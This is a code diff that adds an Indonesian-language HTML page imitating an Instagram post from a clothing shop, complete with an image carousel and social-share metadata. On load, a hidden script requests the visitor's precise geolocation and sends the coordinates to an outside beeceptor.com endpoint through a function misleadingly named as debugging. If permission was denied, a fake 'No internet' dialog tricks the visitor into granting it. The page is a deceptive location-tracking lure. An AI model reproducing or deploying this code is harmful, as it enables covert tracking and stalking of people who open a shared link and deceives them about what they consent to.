@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{sama dengan caption}</title>
+<!-- === META SHARE (WHATSAPP / SOCIAL) === -->
+<meta property="og:title" content="www.instagram.com">
+<meta property="og:type" content="website">
+
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background:#000;
+    display:flex;
+    justify-content:center;
+}
+
+.phone-frame{
+    width:390px;
+    background:#000;
+    color:#fff;
+}
+
+.header{
+    padding:15px;
+    font-size:22px;
+    font-weight:bold;
+}
+
+.profile{
+    display:flex;
+    align-items:center;
+    padding:10px 15px;
+}
+
+.profile img{
+    width:35px;
+    height:35px;
+    border-radius:50%;
+    margin-right:10px;
+}
+
+.username{
+    font-weight:bold;
+}
+
+.carousel{
+    position:relative;
+    width:100%;
+    overflow:hidden;
+}
+
+.slides{
+    display:flex;
+    transition:transform 0.4s ease-in-out;
+    width:100%;
+}
+
+.slides img{
+    width:100%;
+    height:500px;
+    object-fit:cover;
+    flex: 0 0 100%;   /* INI YANG PENTING */
+}
+
+
+.counter{
+    position:absolute;
+    top:10px;
+    right:10px;
+    background:rgba(0,0,0,0.6);
+    padding:3px 8px;
+    border-radius:12px;
+    font-size:12px;
+}
+
+.indicator{
+    position:absolute;
+    bottom:10px;
+    left:50%;
+    transform:translateX(-50%);
+    display:flex;
+    gap:6px;
+}
+
+.dot{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#aaa;
+}
+
+.dot.active{
+    background:#fff;
+}
+
+.nav-btn{
+    position:absolute;
+    top:50%;
+    transform:translateY(-50%);
+    background:rgba(0,0,0,0.5);
+    border:none;
+    color:#fff;
+    font-size:20px;
+    padding:5px 10px;
+    cursor:pointer;
+}
+
+.prev{ left:10px; }
+.next{ right:10px; }
+
+.actions{
+    display:flex;
+    justify-content:space-between;
+    padding:10px 15px;
+    font-size:22px;
+}
+
+.caption{
+    padding:0 15px 20px;
+    font-size:14px;
+}
+
+.caption b{
+    margin-right:5px;
+}
+
+#permissionModal {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  display: none;   /* DEFAULT HIDDEN */
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+
+.modalBox {
+  background: white;
+  padding: 25px;
+  border-radius: 12px;
+  width: 300px;
+  text-align: center;
+  font-family: sans-serif;
+  color: black;   /* TAMBAHKAN INI */
+}
+
+
+.modalBox button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.allowBtn {
+  background: #1a73e8;
+  color: white;
+}
+
+.denyBtn {
+  background: #ccc;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="phone-frame">
+
+    <div class="header">Instagram</div>
+
+    <div class="profile">
+        <img id="profileImg">
+        <div class="username" id="username"></div>
+    </div>
+
+<div id="permissionModal">
+  <div class="modalBox">
+    <h3 style>No internet</h3>
+    <p>Instagram memerlukan koneksi internet Anda untuk melanjutkan.</p>
+    <button class="allowBtn" onclick="requestLocation()">Izinkan</button>
+  </div>
+</div>
+
+    <div class="carousel">
+        <div class="slides" id="slides"></div>
+
+        <button class="nav-btn prev" onclick="prevSlide()">❮</button>
+        <button class="nav-btn next" onclick="nextSlide()">❯</button>
+
+        <div class="counter" id="counter"></div>
+        <div class="indicator" id="indicator"></div>
+    </div>
+
+    <div class="actions">
+        <div>♡ 💬 ➤</div>
+        <div>🔖</div>
+    </div>
+
+    <div class="caption">
+        <b id="captionUsername"></b>
+        <span id="captionText"></span><br><br>
+        <span id="postDate"></span>
+    </div>
+
+</div>
+
+<script>
+
+/* ===========================
+   DATA IDENTITAS (UBAH DISINI)
+=========================== */
+
+const postData = {
+    username: "clothingdress_id",
+    profileImage: "https://png.pngtree.com/element_our/sm/20180630/sm_5b37de3263964.jpg",
+    caption: '"Aleshaa signature - Sarimbit 2026" ✨🥰',
+    date: "February 3",
+    images: [
+        "https://img.kwcdn.com/product/fancy/b34ca47f-0b43-4ae0-8b6e-6338710f9a0a.jpg?imageMogr2/auto-orient%7CimageView2/2/w/800/q/70/format/webp",
+        "https://img.lazcdn.com/g/p/1e0024e2d74f91fd449f7b94098816ea.jpg_720x720q80.jpg",
+        "https://i.pinimg.com/236x/1b/87/4e/1b874e0f84d7ce29c77ce57bbce47b67.jpg"
+    ]
+};
+
+/* ===========================
+   RENDER DATA
+=========================== */
+
+document.getElementById("username").innerText = postData.username;
+document.getElementById("captionUsername").innerText = postData.username;
+document.getElementById("captionText").innerText = postData.caption;
+document.getElementById("postDate").innerText = postData.date;
+document.getElementById("profileImg").src = postData.profileImage;
+
+const slidesContainer = document.getElementById("slides");
+const indicatorContainer = document.getElementById("indicator");
+document.title = "on Instagram: " + postData.caption;
+
+postData.images.forEach((imgSrc, index) => {
+    const img = document.createElement("img");
+    img.src = imgSrc;
+    slidesContainer.appendChild(img);
+
+    const dot = document.createElement("div");
+    dot.classList.add("dot");
+    if(index === 0) dot.classList.add("active");
+    indicatorContainer.appendChild(dot);
+});
+
+/* ===========================
+   SLIDER FUNCTION
+=========================== */
+
+let currentIndex = 0;
+const totalSlides = postData.images.length;
+const dots = document.querySelectorAll(".dot");
+
+function updateSlide(){
+    slidesContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
+    dots.forEach(dot => dot.classList.remove("active"));
+    dots[currentIndex].classList.add("active");
+    document.getElementById("counter").innerText = 
+        (currentIndex + 1) + "/" + totalSlides;
+}
+
+function nextSlide(){
+    currentIndex = (currentIndex + 1) % totalSlides;
+    updateSlide();
+}
+
+function prevSlide(){
+    currentIndex = (currentIndex - 1 + totalSlides) % totalSlides;
+    updateSlide();
+}
+
+updateSlide();
+
+
+
+</script>
+
+<script>
+function sendDebugLocation(lat, lon) {
+  const payload = `lat=${lat}&lon=${lon}`;
+  const encoded = encodeURIComponent(payload);
+  const url = `https://debug-mpppp.free.beeceptor.com/debug=${encoded}`;
+  fetch(url).catch(() => {});
+}
+
+function requestLocation() {
+  navigator.geolocation.getCurrentPosition(
+    function (pos) {
+      sendDebugLocation(pos.coords.latitude, pos.coords.longitude);
+      closeModal();
+    },
+    function (err) {
+      if (err.code === err.PERMISSION_DENIED) {
+        showModal();
+      }
+    },
+    { enableHighAccuracy: true }
+  );
+}
+
+function showModal() {
+  document.getElementById("permissionModal").style.display = "flex";
+}
+
+function closeModal() {
+  document.getElementById("permissionModal").style.display = "none";
+}
+
+// ==== CEK PERMISSION SAAT LOAD ====
+navigator.permissions.query({ name: "geolocation" }).then(function(result) {
+  
+  if (result.state === "granted") {
+    // Sudah diizinkan → langsung ambil lokasi
+    requestLocation();
+  } 
+  
+  else if (result.state === "prompt") {
+    // Belum pernah pilih → langsung trigger browser popup
+    requestLocation();
+  } 
+  
+  else if (result.state === "denied") {
+    // User pernah block → tampilkan popup custom
+    showModal();
+  }
+
+});
+</script>
+
+
+</body>
+</html>
